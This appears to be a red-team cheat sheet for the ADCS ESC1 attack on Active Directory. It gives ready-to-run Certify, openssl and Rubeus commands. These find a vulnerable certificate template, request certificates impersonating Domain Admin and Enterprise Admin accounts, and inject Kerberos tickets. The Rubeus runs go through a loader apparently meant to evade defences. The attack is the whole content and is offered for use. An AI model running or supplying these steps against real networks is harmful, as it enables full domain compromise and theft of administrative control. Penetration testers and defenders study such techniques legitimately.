# ADCS ESC1 (Enrollee Supplies Subject)

Enroll in a certificate template that allows the requestor to specify an arbitrary Subject Alternative Name (SAN). Request a cert for DA/EA.

## Identify Vulnerable Template
```
Certify.exe find /enrolleeSuppliesSubject
```
Look for: `msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT` + enrollment rights for current user group.

## Request Certificate for DA
```
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TEMPLATE> /altname:administrator /sid:<DA_SID>-500
```
Copy output (RSA key + cert) → save as `esc1-DA.pem`.

## Convert PEM to PFX
```
openssl pkcs12 -in esc1-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1-DA.pfx
```
Use a known export password (e.g., `SecretPass@123`).

## Request TGT via PKINIT
```
Loader.exe -path Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
```

## Escalate to EA (Enterprise Admin)
```
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TEMPLATE> /altname:<PARENT_DOMAIN>\administrator /sid:<EA_SID>-500
# Convert pem to esc1-EA.pfx
Loader.exe -path Rubeus.exe -args asktgt /user:<PARENT_DOMAIN>\Administrator /dc:<PARENT_DC> /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt
```

## Notes
- Requires enrollment rights for the template (check group membership)
- `/sid:` parameter ties the cert to a specific account SID for security
